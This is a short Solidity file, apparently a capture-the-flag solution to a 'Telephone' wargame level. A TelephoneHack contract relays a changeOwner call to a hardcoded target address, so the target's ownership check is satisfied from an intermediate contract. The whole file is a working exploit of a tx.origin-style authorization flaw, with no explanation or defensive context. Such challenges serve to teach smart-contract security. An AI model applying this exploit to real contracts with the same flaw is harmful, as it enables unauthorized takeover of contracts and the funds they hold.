pragma solidity ^0.4.18;

contract Telephone {
    function changeOwner(address _owner) public{}
}

contract TelephoneHack {

  address public owner;
  Telephone target = Telephone(0xe76d94c8d9b85ad7ab53c7a2dd1b8d8238f09b13);

  function TelephoneHack() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
      
      target.changeOwner(msg.sender);
  }
}